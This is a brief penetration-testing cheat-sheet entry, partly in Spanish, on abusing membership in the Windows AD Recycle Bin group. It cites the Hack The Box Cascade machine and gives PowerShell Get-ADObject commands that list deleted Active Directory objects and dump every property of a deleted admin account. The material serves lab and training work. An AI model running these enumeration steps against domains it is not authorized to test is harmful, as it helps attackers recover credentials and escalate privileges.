## DESCRIPTION

This group gives you permission to read deleted AD object.
AD Recycle Bin is a well-know Windows group. [Active Directory Object Recovery (or Recycle Bin)](https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/) is a feature added in Server 2008 to allow administrators to recover deleted items just like the recycle bin does for files.

Te da permisos para leer los objetos borrados del AD aunque estos sean de administrador.

#### Mas información
* https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges
* https://0xdf.gitlab.io/2020/07/25/htb-cascade.html#privesc-arksvc--administrator

## EXPLOITATION

```
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects

Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *


#Para obtener mas detalles de una cuenta podemos filtrar por ejemplo usuario TempAdmin
Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *
```

## MACHINES

* Hack The Box: Cascade

